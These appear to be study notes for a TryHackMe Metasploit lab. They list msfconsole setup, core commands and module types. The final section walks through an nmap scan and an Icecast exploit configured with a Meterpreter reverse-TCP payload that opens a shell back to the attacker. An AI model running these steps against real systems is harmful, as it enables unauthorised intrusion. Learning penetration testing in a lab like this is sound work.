# Metasploit

## Intro
- https://darkstar7471.com/resources.html
- Install Metasploit

## Initializing...
- Initialize the database: `msfdb init` (may require `sudo`)
- Display help info: `msfconsole -h`
- Hide banner: `-q`
- Start metasploit: `msfconsole`
- Check database connection: `db_status`
- Connection type: postgresql

## Rock 'em to the Core [Commands]
- Help menu: `help`
- Help menu alias: `?`
- Search command: `search`
- Set active module: `use`
- Display module information: `info`
- Connect to a host: `connect`
- Display banner: `banner`
- Change variable value: `set`
- Change global variable value: `setg`
- View variable value: `get`
- Change variable value to null/no value: `unset`
- Write screen and console output to file: `spool`
- Save settings/active datastores: `save`

## Modules for Every Occasion!
- Exploit module: `exploit`
- Shellcode module: `payload`
- Scan and Verify machines module: `auxiliary`
- Post exploitation, looting, and pivoting module: `post`
- Payload obfuscation module: `encoder`
- Buffer overflow and ROP attacks module: `nop`
- Load modules: `load`

## Move that shell!
- Run nmap: `db_nmap -sV BOX-IP`
- Port 135 Service: msrpc
- List hosts in database: `hosts` 
- List services in database: `services`
- List vulnerabilities in database: `vulns`
- `use icecast`: exploit/windows/http/icecast_header
- Search exploit: `search multi/handler`
- ID column in search: #
- Short hand use module: `use #`
- Set payload:
    - `set PAYLOAD windows/meterpreter/reverse_tcp`
    - `set LHOST YOUR_IP_ON_TRYHACKME`
- Set exploit: `use icecast`
- Set target host: `set RHOSTS BOX_IP`

